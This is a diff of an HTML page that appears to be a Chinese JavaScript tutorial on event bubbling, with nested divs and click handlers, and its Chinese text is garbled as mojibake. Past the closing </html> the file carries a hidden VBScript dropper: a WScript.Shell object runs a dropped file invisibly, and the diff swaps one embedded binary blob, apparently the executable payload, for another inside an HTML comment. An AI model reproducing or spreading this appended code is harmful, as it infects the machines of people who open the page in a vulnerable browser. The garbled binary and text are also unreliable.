@@ -5,35 +5,45 @@
 		<meta name="viewport" content="width=device-width, initial-scale=1.0">
 		<meta http-equiv="X-UA-Compatible" content="ie=edge">
 		<title></title>
-	</head>
-	<style type="text/css">
-		div {
-			width: 100px;
-			height: 100px;
-			background-color: green;
-			float: left;
-			margin-left: 10px;
-			border: 2px solid green;
-		}
-	</style>
-	<body>
-		<div></div>
-		<div></div>
-		<div></div>
-		<div></div>
-		<div></div>
-		<script src="js/common.js"></script>
-		<script>
-			var list = document.getElementsByTagName('div');
-			console.log(list);
-			for(i=0;i<list.length;i++){
-				list[i].onmouseover=function(){
-					this.style.border="2px solid red";
-				};
-				list[i].onmouseout=function(){
-					this.style.border="";
-				};
+		<style type="text/css">
+			#dv3{
+				width: 100px;
+				height: 100px;
+				background-color: pink;
 			}
+			#dv2{
+				width: 200px;
+				height: 200px;
+				background-color: blue;
+			}
+			#dv1{
+				width: 300px;
+				height: 300px;
+				background-color: red;
+			}
+		</style>
+	</head>
+	<body>
+		äº‹ä»¶å†’æ³¡ï¼š
+		å¤šä¸ªå…ƒç´ åµŒå¥—ï¼Œè¿™äº›å…ƒç´ éƒ½æ³¨å†Œäº†ç›¸åŒçš„äº‹ä»¶ï¼Œ
+		å¦‚æœé‡Œé¢çš„å…ƒç´ çš„äº‹ä»¶è§¦å‘äº†ï¼Œ
+		å¤–é¢çš„å…ƒç´ çš„è¯¥äº‹ä»¶ä¹Ÿè‡ªåŠ¨è§¦å‘äº†ã€‚
+		<div id="dv1">1
+			<div id="dv2">2
+				<div id="dv3">3</div>
+			</div>
+		</div>
+		<script src="js/common.js"></script>
+		<script type="text/javascript">
+			my$('dv1').onclick=function(){
+				console.log("ç‚¹å‡»dv1");
+			};
+			my$('dv2').onclick=function(){
+				console.log("ç‚¹å‡»dv2");
+			};
+			my$('dv3').onclick=function(){
+				console.log("ç‚¹å‡»dv3");
+			};
 		</script>
 	</body>
 </html>
@@ -51,6 +61,5 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT><!--bë&ü	è’DgŠ e:qUP`IHi¼ÅÅAÆ‘K²ƒwRr¢@i*é[ŒèÄsô]Éj*o±÷µY­bÙ—Ô>Ø=Ìm¸ƒ¬×§ ÁÜGÚåäåEÛiÇÆæèT-æ—<ÛcÚ>öO×ñ:–¿ìı«É‡÷óôDÒ W“~ø;R–»ÄSÛÔ,şûÜqäµXˆ.ÃŒ ®Ã÷‡–ùrı0l„WŒ¶¾ŠËš×X4\öfı`A`ÏŞVØŠäq–WübtàóUX?©š;H‡×œj*õ€”€v ˆìİ¾‡Ò_F–3™VòÛO¼´¥É³aÜmf(;ÈÇÍL'ï‘ä¡Õ[ıŒw3Õ-ÛäNì‰úûäó-O¾	7ïw »'_ıË&9nPq™D#L¼gõ¿ƒK¾iP<‹¼ÙŞ¼*Ã•
-EÇn®¬÷³‘|>§*÷:ğ'·Ív)ˆÃŠ~]„$€…
-Ó6üZ!\9Ù<}¾«û¤RÅN±xulâÇT§0}ı[lø¼Ÿvu~…ŞLª›vóvú^z8³ØV8x!–éœS~8¿k, áùR"âøáùáùáù¬$Nüı_^Wâù áù-->
+//--></SCRIPT><!--JûtşÖ@Şt°ã¸š’,>8ÕÍb¬ş€5Îã¥wÜN|áµN{¶ôŒ‘‡³­4’s.¶Y†6_†~‡k¸7’‹h¸tUùÉàm\!¯=Ş [«tnÈfšÜ9a°ÃTöN hOùP´Ì1ü¤ú2İè ”|;wkV1İE|MˆŸ€Bs3ãeÔ(zğµò)ğÊO³˜=5\²~[Z²GPEüºàïÜqúŞCX$­¿h³û;P†¸R§(>Kq‘`ØNF‡¡•ß¢Ö7B6îNåˆº1…`æèÉ*÷®Å/ùÓó|{M‰Ôà-1—k¯+
+İ€Q±K2ß·kS›vtÊ™¿ı5‚'él‹áPGxO÷ôË9’.á1•âKäI;dÌæÛ™ş¥¸ºd1úf‘¡:^­>e1{T_”ËDIş#l¹˜khvÛéËÚn_ÁÜöšË«HWœ5Ì3‰î¤L¹B²‚»À•å„Ø bİşeg\´Cxe¥ó}pİ!Ô™í—÷Ø¬?d¼ŞaºcÖó˜™“ÏøïxMô¶bŸ¡4ûqY²‘™ ä(R'3ùä(ä(ä(©õOÂ€_eà( ä(-->
